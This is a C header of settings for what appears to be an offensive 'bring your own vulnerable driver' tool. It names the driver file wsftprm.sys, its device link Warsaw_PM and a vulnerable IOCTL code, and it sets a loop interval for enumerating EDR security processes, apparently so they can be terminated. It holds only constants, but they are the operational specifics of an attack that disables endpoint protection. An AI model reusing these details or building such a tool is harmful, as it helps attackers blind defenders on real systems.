/*
		Store all variables and settings used across the project
*/

#pragma once

// Define path for the driver file
#define g_VULNDRIVERPATH		L"\\System32\\Drivers\\"		// Variable for the driver path which is the default directory for runtime-loaded kernel drivers

// Define variables for the vulnerable driver
#define g_VULNDRIVERNAME		L"wsftprm"						// Service name to be registered
#define g_VULNDRIVERFILENAME	L"wsftprm.sys"					// Name of the driver file written to disk
#define g_VULNDRIVERSYMLINK		L"\\\\.\\Warsaw_PM"				// Symbolic link of the vulnerable driver

// Define IOCTL code
#define IOCTL_CODE				0x22201C						// Vulnerable IOCTL code

// Define the sleep time
#define g_SLEEPTIME				1000							// Time to sleep inbetween EDR process enumerations loops

// Define retry settings for opening the device handle
#define g_DEVICEHANDLE_RETRY_COUNT	5							// Amount of attempts before failing
#define g_DEVICEHANDLE_RETRY_DELAY	500							// Sleep time between handle open attempts (ms)
